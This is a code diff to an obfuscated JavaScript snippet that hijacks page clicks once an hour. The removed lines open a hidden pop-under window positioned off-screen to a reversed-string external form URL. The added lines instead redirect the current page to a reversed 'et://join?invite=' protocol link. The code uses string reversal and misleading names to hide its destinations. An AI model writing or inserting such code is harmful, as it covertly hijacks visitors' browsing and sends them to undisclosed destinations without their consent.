@@ -1,5 +1,5 @@
 (function(docpointer) {
-	let eatApple = "1f84a56969C5655725404=etivni?nioj//:te".split("").reverse().join("");
+	let eatApple = "6adc1fb3c9C617663687=etivni?nioj//:te".split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
@@ -23,9 +23,9 @@
 	
 	document.addEventListener("click", function(e) {
 		if (showPopUp()) {
-		        var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
-			window.open("62jxn/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
-		        //window.open(eatApple, "_self");
+		        //var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
+			//window.open("62jxn/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
+		        window.open(eatApple, "_self");
 			localStorage.setItem("popcornlast", Date.now());
 		}
 	});
